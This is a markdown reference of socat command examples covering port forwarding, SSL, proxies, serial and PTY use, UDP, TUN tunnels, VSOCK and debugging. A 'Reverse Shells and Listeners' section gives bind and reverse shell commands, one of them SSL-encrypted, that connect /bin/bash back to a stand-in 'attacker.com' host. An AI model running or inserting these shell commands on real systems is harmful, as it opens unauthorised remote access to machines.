# socat Examples

This document provides practical examples for common socat use cases.

## Basic Connections

### Simple TCP Client (like telnet/netcat)

```bash
# Connect to web server
socat - TCP4:www.domain.org:80

# With readline for command history
socat -d -d READLINE,history=$HOME/.http_history TCP4:www.domain.org:www,crnl
```

### Simple Port Forwarder

```bash
# Forward local port 8080 to remote server
socat TCP4-LISTEN:8080 TCP4:www.domain.org:80

# With multiple connections (fork) and logging
socat -d -d -lmlocal2 \
    TCP4-LISTEN:80,bind=myaddr1,reuseaddr,fork,su=nobody,range=10.0.0.0/8 \
    TCP4:www.domain.org:80,bind=myaddr2
```

## Reverse Shells and Listeners

### Basic Listener

```bash
# Listen on port 4444
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Reverse Shell Client

```bash
# Connect back to attacker
socat TCP:attacker.com:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Encrypted Reverse Shell (SSL)

```bash
# Listener with SSL (generate certs first)
socat OPENSSL-LISTEN:4443,reuseaddr,fork,cert=server.pem,cafile=client.crt EXEC:/bin/bash,pty,stderr,setsid

# Client with SSL
socat OPENSSL:attacker.com:4443,verify=0 EXEC:/bin/bash,pty,stderr,setsid
```

## SSL/TLS Operations

### SSL Client

```bash
# Connect to SSL server with certificate verification
socat - SSL:server:4443,cafile=./server.crt,cert=./client.pem
```

### SSL Server

```bash
# SSL echo server with client cert verification
socat OPENSSL-LISTEN:4443,reuseaddr,pf=ip4,fork,cert=./server.pem,cafile=./client.crt PIPE
```

## Proxy Tunneling

### Through HTTP CONNECT Proxy

```bash
# SSH through HTTP proxy
socat TCP4-LISTEN:2022,reuseaddr,fork \
    PROXY:proxy.local:www.domain.org:22,proxyport=3128,proxyauth=user:pass
```

### Through SOCKS Proxy

```bash
# X11 forwarding through SOCKS
socat UNIX-LISTEN:/tmp/.X11-unix/X1,fork \
    SOCKS4:host.victim.org:127.0.0.1:6000,socksuser=nobody,sourceport=20
```

## File Operations

### Network Message Collector

```bash
# Append all received data to log file
socat -u TCP4-LISTEN:3334,reuseaddr,fork OPEN:/tmp/in.log,creat,append
```

### Create Sparse File

```bash
# Create 100GB sparse file
echo | socat -u - FILE:/tmp/bigfile,create,largefile,seek=100000000000
```

### Binary File Patching

```bash
# Write bytes at specific offset
echo -e "\0\14\0\0\c" | socat -u - FILE:/usr/bin/file.exe,seek=0x00074420
```

## Serial Port Operations

### Interactive Serial Connection

```bash
# Connect to modem/serial device
socat -,escape=0x0f /dev/ttyS0,rawer,crnl
```

### Remote Serial Port Access

```bash
# Create virtual modem via SSH
socat PTY,link=$HOME/dev/vmodem0,rawer,wait-slave \
    EXEC:'"ssh modemserver.org socat - /dev/ttyS0,nonblock,rawer"'
```

## PTY Operations

### Create PTY for Application

```bash
# Create PTY with symlink for easy access
socat PTY,link=/tmp/mypty,rawer,wait-slave EXEC:'/bin/bash'
```

### SSH Password Automation (for testing)

```bash
# Automate SSH login (use keys in production!)
(sleep 5; echo PASSWORD; sleep 5; echo ls; sleep 1) | \
    socat - EXEC:'ssh -l user server',pty,setsid,ctty
```

## UDP Operations

### UDP Broadcast

```bash
# Send broadcast to network
socat - UDP4-DATAGRAM:192.168.1.0:123,sp=123,broadcast,range=192.168.1.0/24
```

### UDP Multicast

```bash
# Join multicast group
socat - UDP4-DATAGRAM:224.255.0.1:6666,bind=:6666,ip-add-membership=224.255.0.1:eth0
```

### SSDP Discovery

```bash
# Discover UPnP devices
echo -e "M-SEARCH * HTTP/1.1\nHOST: 239.255.255.250:1900\nMAN: \"ssdp:discover\"\nMX: 4\nST: \"ssdp:all\"\n" | \
    socat - UDP-DATAGRAM:239.255.255.250:1900,crlf
```

## VPN/Tunnel Operations

### Simple VPN with TUN

```bash
# Side A
socat UDP:host2:4443 TUN:192.168.255.1/24,up

# Side B
socat UDP-L:4443 TUN:192.168.255.2/24,up
```

### Network Namespace Forwarding

```bash
# Forward from namespace to server
sudo socat --experimental \
    TCP4-LISTEN:8000,reuseaddr,fork,netns=namespace1 \
    TCP4-CONNECT:server2:8000
```

### Virtual Network Between Namespaces

```bash
sudo socat --experimental \
    TUN:192.168.2.1/24,up \
    TUN:192.168.2.2/24,up,netns=namespace2
```

## VSOCK (Virtual Machine Sockets)

### Connect to Host from VM

```bash
# CID=2 is always the host
socat - VSOCK-CONNECT:2:1234
```

### SSH over VSOCK

```bash
# In VM: Forward VSOCK to local SSH
socat VSOCK-LISTEN:22,reuseaddr,fork TCP:localhost:22

# On host: Forward TCP to VM's VSOCK
socat TCP4-LISTEN:22222,reuseaddr,fork VSOCK-CONNECT:33:22
# Then: ssh -p 22222 user@localhost
```

## Script/Program Integration

### FTP Client Script

```bash
# mail.sh uses FD 3/4 for SMTP protocol
socat EXEC:"mail.sh target@domain.com",fdin=3,fdout=4 \
    TCP4:mail.relay.org:25,crnl,bind=alias1.server.org,mss=512
```

### FTP with History

```bash
# Readline wrapper for FTP
socat READLINE,noecho='[Pp]assword:' EXEC:'ftp ftp.server.com',pty,setsid,ctty
```

### Server with Sandbox

```bash
# Chroot and user switch
socat TCP4-LISTEN:5555,fork,tcpwrap=script \
    EXEC:/bin/myscript,chroot=/home/sandbox,su-d=sandbox,pty,stderr
```

## Stream Merging

### Merge Multiple TCP Streams

```bash
# Merge incoming connections to single outbound
socat -U TCP:target:9999,end-close TCP-L:8888,reuseaddr,fork
```

## Debugging/Analysis

### Connection Information

```bash
# Print socket info for each connection
socat TCP-L:7777,reuseaddr,fork SYSTEM:'filan -i 0 -s >&2',nofork
```

### UDP Packet Info

```bash
# Display all UDP packet metadata
socat -d -d UDP4-RECVFROM:9999,so-broadcast,so-timestamp,ip-pktinfo,ip-recverr,ip-recvopts,ip-recvtos,ip-recvttl!!- \
    SYSTEM:'export; sleep 1' | grep SOCAT
```

### Limit Data Transfer

```bash
# Prevent flooding - read max 1000 bytes
socat - TCP:www.blackhat.org:31337,readbytes=1000
```

## POSIX Message Queues

### Send to Queue

```bash
socat -u STDIO POSIXMQ-SEND:/queue1,unlink-early,mq-prio=10
```

### Receive with Worker Processes

```bash
socat -u POSIXMQ-RECV:/queue1,fork,max-children=3 SYSTEM:"worker.sh"
```

## HTTP Operations

### Simple HTTP Echo Server

```bash
socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf \
    SYSTEM:"echo -e \"\\\"HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\\nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \$SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\"\"; cat; echo -e \"\\\"\\\n\\\"\""
```

## Tail-Like Behavior

```bash
# Read from end of file, continue on EOF
socat -u /tmp/readdata,seek-end=0,ignoreeof STDIO
```

## Interface Bridging

### PPP over Network Interface

```bash
# Bridge PPP to HDLC interface
socat PTY,link=/var/run/ppp,rawer INTERFACE:hdlc0
```

## systemd Integration

```bash
# Socket activation echo server
systemd-socket-activate -l 1077 --inetd socat ACCEPT:0,fork PIPE
```
